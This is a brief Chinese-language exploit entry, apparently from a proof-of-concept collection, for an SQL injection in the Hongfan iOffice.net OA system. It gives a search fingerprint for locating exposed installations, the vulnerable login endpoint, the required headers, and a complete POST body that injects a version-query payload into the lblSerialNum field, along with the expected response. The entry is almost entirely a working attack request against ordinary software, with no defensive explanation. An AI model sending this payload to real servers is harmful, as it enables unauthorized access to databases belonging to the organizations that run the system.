# 红帆OAHbcaUserLogin存在SQL注入漏洞

- **系统**：红帆　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`title="iOffice.net"`
- **请求**：`POST /ioffice/Identity/HbcaUserLogin.aspx HTTP/1.1`
- **关键头**：`X-MicrosoftAjax: Delta=true`　`Content-Type: application/x-www-form-urlencoded; charset=utf-8`

**请求体 / payload**
```
__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwULLTEyMTUyMDIxNTRkZP07H79WIvd3R0It8GvgZeNLQtUV&__VIEWSTATEGENERATOR=65AD83CA&lblSerialNum='-1@@VERSION--&btVerify=
```
- **预期**：200　|　—